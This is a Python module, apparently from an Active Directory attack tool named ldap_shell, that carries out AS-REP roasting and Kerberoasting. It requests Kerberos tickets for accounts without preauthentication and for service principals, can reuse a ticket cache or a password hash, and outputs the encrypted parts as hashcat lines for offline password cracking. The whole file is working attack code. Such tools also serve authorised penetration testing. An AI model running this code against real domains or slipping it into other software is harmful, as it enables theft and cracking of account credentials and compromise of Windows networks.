"""Build hashcat strings for AS-REP and Kerberoast."""
import datetime
import logging
import os
import random
from binascii import hexlify
from typing import Optional, Tuple

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from ldap_shell.krb5 import constants
from ldap_shell.krb5.asn1 import (
    AS_REP,
    AS_REQ,
    KERB_PA_PAC_REQUEST,
    TGS_REP,
    seq_set,
    seq_set_iter,
)
from ldap_shell.krb5.kerberos_v5 import getKerberosTGS, getKerberosTGT, sendReceive
from ldap_shell.krb5.types import KerberosTime, Principal
from ldap_shell.utils import current_sam, parse_hashes

log = logging.getLogger('ldap-shell.roast')


def format_asrep(username: str, domain: str, etype: int, cipher: bytes) -> str:
    """Hashcat AS-REP line (mode 18200 / 19800 / 19900)."""
    user = f'{username}@{domain.upper()}'
    if etype == 23:
        return (
            f'$krb5asrep${etype}${user}:'
            f'{hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}'
        )
    return (
        f'$krb5asrep${etype}${user}$'
        f'{hexlify(cipher[-12:]).decode()}${hexlify(cipher[:-12]).decode()}'
    )


def format_tgs(username: str, domain: str, spn: str, etype: int, cipher: bytes) -> str:
    """Hashcat TGS line (mode 13100 / 19600 / 19700)."""
    if etype == 23:
        checksum, rest = cipher[:16], cipher[16:]
    else:
        checksum, rest = cipher[-12:], cipher[:-12]
    return (
        f'$krb5tgs${etype}$*{username}${domain.upper()}${spn}*'
        f'${hexlify(checksum).decode()}${hexlify(rest).decode()}'
    )


def asrep_hash(username: str, domain: str, kdc_host: str) -> str:
    """Request an AS-REP without preauth and return the hashcat string."""
    domain = domain.upper()
    as_req = AS_REQ()
    server = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    user = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    pac = KERB_PA_PAC_REQUEST()
    pac['include-pac'] = True
    as_req['pvno'] = 5
    as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    as_req['padata'] = noValue
    as_req['padata'][0] = noValue
    as_req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
    as_req['padata'][0]['padata-value'] = encoder.encode(pac)
    body = seq_set(as_req, 'req-body')
    opts = [
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.proxiable.value,
    ]
    body['kdc-options'] = constants.encodeFlags(opts)
    seq_set(body, 'sname', server.components_to_asn1)
    seq_set(body, 'cname', user.components_to_asn1)
    body['realm'] = domain
    now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None) + datetime.timedelta(days=1)
    body['till'] = KerberosTime.to_asn1(now)
    body['rtime'] = KerberosTime.to_asn1(now)
    body['nonce'] = random.getrandbits(31)
    seq_set_iter(body, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value),))
    reply = sendReceive(encoder.encode(as_req), domain, kdc_host)
    decoded = decoder.decode(reply, asn1Spec=AS_REP())[0]
    if int(decoded['msg-type']) != int(constants.ApplicationTagNumbers.AS_REP.value):
        raise RuntimeError(f'KDC did not return AS-REP for {username}')
    etype = int(decoded['enc-part']['etype'])
    cipher = bytes(decoded['enc-part']['cipher'])
    return format_asrep(username, domain, etype, cipher)


def _tgt_from_client(client, domain: str, kdc_host: str):
    """Get a TGT from KRB5CCNAME or the bound LDAP password/hash."""
    from ldap_shell.krb5.ccache import CCache

    ccache_path = os.environ.get('KRB5CCNAME')
    if ccache_path and os.path.isfile(ccache_path):
        try:
            cache = CCache.loadFile(ccache_path)
            creds = cache.getCredential(f'krbtgt/{domain.upper()}@{domain.upper()}')
            if creds is not None:
                tgt = creds.toTGT()
                return tgt['KDC_REP'], tgt['cipher'], tgt['sessionKey']
        except Exception:
            log.debug('Could not reuse KRB5CCNAME for roast', exc_info=True)

    user = current_sam(client)
    if not user:
        raise RuntimeError('No session identity for Kerberoast')
    password = getattr(client, 'password', None) or ''
    lmhash, nthash = '', ''
    if password and (':' in password or (len(password) == 32 and all(c in '0123456789abcdefABCDEF' for c in password))):
        lmhash, nthash = parse_hashes(password)
        password = ''
    principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, _old, session_key = getKerberosTGT(
        principal, password, domain, lmhash or '', nthash or '', '', kdc_host,
    )
    return tgt, cipher, session_key


def tgs_hash(client, username: str, domain: str, spn: str, kdc_host: str,
             tgt_cache: Optional[Tuple] = None) -> Tuple[str, Tuple]:
    """Request a TGS and return (hashcat line, tgt_cache for reuse)."""
    if tgt_cache is None:
        tgt_cache = _tgt_from_client(client, domain, kdc_host)
    tgt, cipher, session_key = tgt_cache
    server = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs, _tgs_cipher, _old, _sess = getKerberosTGS(server, domain, kdc_host, tgt, cipher, session_key)
    decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    etype = int(decoded['enc-part']['etype'])
    blob = bytes(decoded['enc-part']['cipher'])
    return format_tgs(username, domain, spn, etype, blob), tgt_cache
